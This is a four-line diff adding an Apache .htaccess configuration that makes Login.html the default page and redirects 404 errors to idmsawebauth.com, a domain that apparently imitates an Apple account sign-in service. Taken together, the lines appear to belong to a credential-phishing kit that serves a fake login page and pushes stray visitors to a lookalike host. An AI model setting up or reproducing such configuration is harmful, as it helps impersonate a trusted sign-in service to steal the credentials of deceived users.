@@ -1,0 +1,4 @@
+RewriteBase /
+DirectoryIndex Login.html
+
+ErrorDocument 404 http://idmsawebauth.com
